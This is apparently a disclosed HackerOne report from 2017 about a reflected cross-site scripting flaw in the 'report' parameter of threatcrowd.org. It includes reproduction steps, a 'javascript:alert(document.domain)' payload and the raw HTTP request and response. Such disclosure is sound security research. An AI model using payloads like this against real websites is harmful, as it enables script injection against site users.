@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/283646
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/ramsexy
+ReportedTo:AlienVault (alienvault_security)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:01.11.2017 15:26:15
+
+Summary:
+
+**Summary:**
+I have found a reflected XSS in https://www.threatcrowd.org/report.php in GET parameter *report*
+
+## Browsers Verified In:
+
+  * Firefox 56.0.1
+
+## Steps To Reproduce:
+1. Browse to https://www.threatcrowd.org/report.php?report=javascript%3aalert(document.domain)
+2. Click on **Visit javascript:alert(document.domain)**
+3. XSS should trigger
+
+## Supporting Material/References:
+{F233598}
+## HTTP request / response
+**Request**
+```
+GET /report.php?report=javascript%3aalert(document.domain) HTTP/1.1
+Host: www.threatcrowd.org
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://www.threatcrowd.org/domain.php?domain=]]%3e%3e%3c
+Cookie: __cfduid=d00f363a311a6d1336bc58834a8fe6a341509141512; FirstVisit=No
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+```
+**Response**
+```
+  <a href='javascript:alert(document.domain)' target='_new'>Visit javascript:alert(document.domain)</a></table>
+```
